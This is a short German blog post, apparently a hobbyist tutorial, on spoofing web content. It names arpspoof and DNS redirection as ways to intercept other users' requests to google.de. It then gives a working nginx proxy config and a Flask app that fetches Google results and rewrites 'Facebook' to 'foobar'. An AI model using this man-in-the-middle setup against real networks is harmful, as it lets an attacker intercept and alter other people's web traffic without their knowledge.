---
date: '2015-03-06'
title: Foobar statt Facebook - HTML spoofing mit Python
---

Ich habe mich mal etwas mit der 'Sicherheit' beim ausliefern von Websiten beschäftigt und wie man dort am besten manipulieren kann. Umso mehr Kontrolle man im Netzwerk hat, umso weniger braucht man natürlich beachten. Generell braucht man aber eigentlich gar keine Kontrolle und arbeitet einfach mit vielen verschiedenen Methoden zusammen. Spätestens mit arpspoof ist man dann Gateway und hat alles was man so braucht.

Nehmen wir mal an, wir leiten per DNS alle Anfragen an 'google.de' an einen seperaten Server. Am angegebenen Ziel haben wir einen nginx welcher wiederum die Anfragen unterschiedlich bearbeitet. Wir wollen alles, was unter Google gesucht werden soll an eine lokale Flask-App geben. Dafür eignen sich die folgenden Locations:

```nginx
server {
  location / {
    proxy_pass http://localhost:5000;
  }
  location /search {
    proxy_pass http://localhost:5000;
  }
}
```

Nun haben wir aber das Problem, dass dort auch Resourcen die Google lokal abruft (Logo etc) mit ausgeliefert werden müssten. Das umgehen wir einfach indem wir alles was mit Bildern oÄ zutun hat einfach wieder an Google abtreten.

```nginx
  location /images {
    proxy_pass http://216.239.32.20;
  }
  location ~ favicon.ico {
    proxy_pass http://216.239.32.20;
  }
```

Damit haben wir also schon mal alle Request die wir wirklich zu bearbeiten haben an die korrekte Adresse verwiesen. In Python brauchen wir nun also nurnoch den Request nehmen, ausführen, das Ergebniss modifizieren und ausliefern. Das klingt alles relativ komplex, ist aber relativ einfach. Hier mal die fertige App:

```python
from flask import Flask, request
import urllib.request
import re

app = Flask(__name__)
app.debug = True

@app.route('/')
@app.route('/search')
def index():
    query = request.args.get('q')

    if query:
        url = 'http://216.239.32.20/search?q=%s' % (query,)
        a = urllib.request.urlopen(getRequest(url))
        return setFacebookFoobar(a.readall().decode('utf-8'))

    moo = urllib.request.urlopen('http://216.239.32.20/').readall()
    return re.sub('action="[^"]+','action="/', str(moo)).replace("b'", "")

def setFacebookFoobar(content):
        body = re.sub('[Ff]acebook', 'foobar', content)
        return body


def getRequest( url ):
     req = urllib.request.Request(
        url,
        data=None,
        headers={
           'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36'
        }
     )
     return req

def getimages():
    return urllib.request.urlopen('http://216.239.32.20' + request.path).readall()

if __name__ == '__main__':
    app.run(host='0.0.0.0')
```
